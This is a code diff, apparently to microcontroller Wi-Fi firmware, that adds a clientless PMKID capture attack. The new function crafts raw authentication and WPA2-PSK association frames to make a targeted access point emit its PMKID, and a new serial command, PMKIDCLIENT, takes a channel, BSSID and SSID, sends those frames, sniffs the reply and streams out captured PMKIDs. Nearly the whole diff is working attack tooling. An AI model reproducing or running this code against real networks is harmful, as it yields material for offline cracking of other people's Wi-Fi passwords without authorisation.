@@ -614,6 +614,7 @@ static void sta_stream(int ch) {
 typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
 static pmkid_t pmkids[PMKID_MAX];
 static volatile uint8_t pmkid_n = 0;
+static volatile uint32_t cl_eapol = 0;   // EAPOL frames seen during a clientless grab (debug)
 
 static void hex12(const uint8_t* m, char* out) {
   snprintf(out, 13, "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
@@ -653,6 +654,7 @@ static void pmkid_handle(const uint8_t* buf, unsigned len) {
 static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
   (void)ud;
   if (len < 34 || ((buf[0] >> 2) & 3) != 2) return;   // data frames only
+  if ((buf[30] == 0x88 && buf[31] == 0x8e) || (buf[32] == 0x88 && buf[33] == 0x8e)) cl_eapol++;
   pmkid_handle(buf, len);
 }
 
@@ -678,6 +680,48 @@ static void pmkid_stream(int ch) {
   }
   String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)pmkid_n);
   Serial.println(fin); Serial1.println(fin);
+}
+
+// P6 clientless PMKID: raw open-auth + WPA2-PSK assoc to make the AP start the 4-way and
+// replay M1 (with the PMKID), then capture it from promisc. No client needed. The SSID is
+// required — many APs reject assoc with an empty/wrong SSID.
+static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
+  wext_set_channel(WLAN0_NAME, ch);
+  char macstr[20] = {0};
+  wifi_get_mac_address(macstr);            // returns "AA:BB:CC:DD:EE:FF" as a string
+  uint8_t sta[6];
+  for(int i = 0; i < 6; i++) sta[i] = (uint8_t)strtoul(macstr + i * 3, NULL, 16);
+  // Authentication (open system, seq 1)
+  uint8_t auth[30];
+  memset(auth, 0, sizeof(auth));
+  auth[0] = 0xB0;
+  memcpy(auth + 4, bssid, 6);
+  memcpy(auth + 10, sta, 6);
+  memcpy(auth + 16, bssid, 6);
+  auth[26] = 0x01;   // auth seq number = 1
+  wifi_tx_raw_frame(auth, 30);
+  delay(30);
+  // Association request (ESS + Privacy, SSID + rates + RSN WPA2-PSK/CCMP)
+  uint8_t f[256];
+  int n = 0;
+  f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;
+  memcpy(f + n, bssid, 6); n += 6;
+  memcpy(f + n, sta, 6);   n += 6;
+  memcpy(f + n, bssid, 6); n += 6;
+  f[n++] = 0x00; f[n++] = 0x00;   // seq (set automatically)
+  f[n++] = 0x11; f[n++] = 0x04;   // capability: ESS | Privacy
+  f[n++] = 0x0A; f[n++] = 0x00;   // listen interval
+  int sl = strlen(ssid);
+  if(sl > 32) sl = 32;
+  f[n++] = 0x00; f[n++] = (uint8_t)sl;
+  memcpy(f + n, ssid, sl); n += sl;
+  f[n++] = 0x01; f[n++] = 0x08;
+  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
+  f[n++] = 0x32; f[n++] = 0x04;
+  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
+  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
+    memcpy(f + n, rsn, 22); n += 22; }
+  wifi_tx_raw_frame(f, n);
 }
 
 // --- A: HELLO/IDENT handshake + capability advertisement ----------------------
@@ -1344,6 +1388,40 @@ void loop() {
       for(int i=0;i<secs;i++) delay(1000);
       wifi_set_promisc(0, NULL, 0);
       sta_stream(ch);
+    }else if(readString.substring(0,11)=="PMKIDCLIENT"){
+      // P6 clientless: raw-assoc to make the AP replay M1, capture the PMKID.
+      // Args: PMKIDCLIENT <chan> <bssid-12hex> <ssid...>
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      String bhex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
+      String ssid = (s3 > 0) ? readString.substring(s3+1, readString.length()-1) : String("");
+      if(ch < 1 || ch > 165) ch = 6;
+      uint8_t bssid[6]; bool ok = (bhex.length() == 12);
+      for(int i=0; ok && i<6; i++)
+        bssid[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      if(!ok || ssid.length() == 0){
+        Serial.println("ERR:PMKIDCLIENT:args"); Serial1.println("ERR:PMKIDCLIENT:args");
+      }else{
+        pmkid_n = 0;
+        cl_eapol = 0;
+        char macstr[20] = {0};
+        wifi_get_mac_address(macstr);
+        char ssidbuf[33]; ssid.toCharArray(ssidbuf, sizeof(ssidbuf));
+        String r = String("PMKIDCLIENT:assoc sta=") + macstr;
+        Serial.println(r); Serial1.println(r);
+        pmkid_clientless(ch, bssid, ssidbuf);
+        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_pmkid_cb, 0);
+        for(int i=0;i<6;i++){
+          delay(1000);
+          if(i == 1 || i == 3) pmkid_clientless(ch, bssid, ssidbuf);  // retry assoc
+        }
+        wifi_set_promisc(0, NULL, 0);
+        String d = "PMKIDCLIENT:eapol=" + String((unsigned)cl_eapol);
+        Serial.println(d); Serial1.println(d);
+        pmkid_stream(ch);
+      }
     }else if(readString.substring(0,5)=="PMKID"){
       // P6 passive: extract PMKID from any M1 seen. Args: PMKID <chan> [secs]
       int s1 = readString.indexOf(' ');
